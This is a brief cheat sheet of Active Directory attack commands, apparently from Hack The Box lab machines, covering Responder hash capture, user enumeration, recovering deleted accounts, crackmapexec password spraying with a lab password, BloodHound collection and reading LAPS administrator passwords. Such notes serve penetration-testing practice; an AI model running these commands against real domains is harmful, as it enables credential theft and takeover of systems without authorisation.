#### Notes for active directory:

If a user belongs to the Remote Management USers group we can gain access to the machine through evil-winrm.

##### Command for Responder: 
```
responder -I tun0
```

###### Check if user belongs to the group with windapsearch:
```
./windapsearch.py -U --full --dc-ip 10.10.10.182
```

##### tightvnc write up for decryption:
```
https://github.com/frizb/PasswordDecrypts
```
##### The Get-ADUser cmdlet can be used to list the properties of a user:
```
Get-ADUser -identity s.smith -properties *
```
#### Shows groups user belongs to:
```
whoami /all
```
###### Get Active Directory Objects:
```
Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
```
##### Include object class only:
```
Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -
IncludeDeletedObjects
```

##### Display filter to select a specific account only:
```
Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)
(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
```
##### Used to spray passwords for users:
```
crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876 --continue-on-success
```

##### Used to collect domain information for bloodhound: 
```
bloodhound-python -c ALL -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248
```
##### Get LAPS administrtor Password if you have permissions"
```
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```
